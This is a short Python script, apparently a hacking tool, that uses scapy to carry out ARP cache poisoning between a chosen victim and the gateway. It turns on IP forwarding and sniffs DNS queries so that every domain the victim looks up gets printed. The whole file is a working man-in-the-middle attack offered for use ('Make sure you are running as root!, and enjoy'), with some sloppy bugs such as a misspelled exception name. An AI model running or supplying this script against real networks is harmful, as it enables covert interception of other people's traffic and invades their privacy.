#!/usr/bin/env python3

from scapy.all import *
import threading
import os
import sys


VIP = input('Please enter the IP address of the victim computer: ')
GW = input('Please enter th IP address of the gateway: ')
IFACE = input('Please enter the name of your interface: ')
print('\nMake sure you are running as root!, and enjoy.')

print('\t\t\nPoisoning Victim & Gateway! .. ')

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def dnshandle(pkt):
    # Strip what information you need from the packet capture
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        print('Victim: ' + VIP + ' has searched for: ' +
              pkt.getlayer(DNS).qd.qname)


def v_poison():
    v = ARP(pdst=VIP, psrc=GW)
    while True:
        try:
            send(v, verbose=0, inter=1, loop=1)
        except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
            sys.exit(1)


def gw_poison():
    gw = ARP(pdst=GW, psrc=VIP)
    while True:
        try:
            send(gw, verbose=0, inter=1, loop=1)
        except KeyboardInterupt:
            sys.exit(1)


vthread = []
gwthread = []


while True:  # Threads

    vpoison = threading.Thread(target=v_poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()

    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()

    pkt = sniff(iface=IFACE, filter='udp port 53', prn=dnshandle)
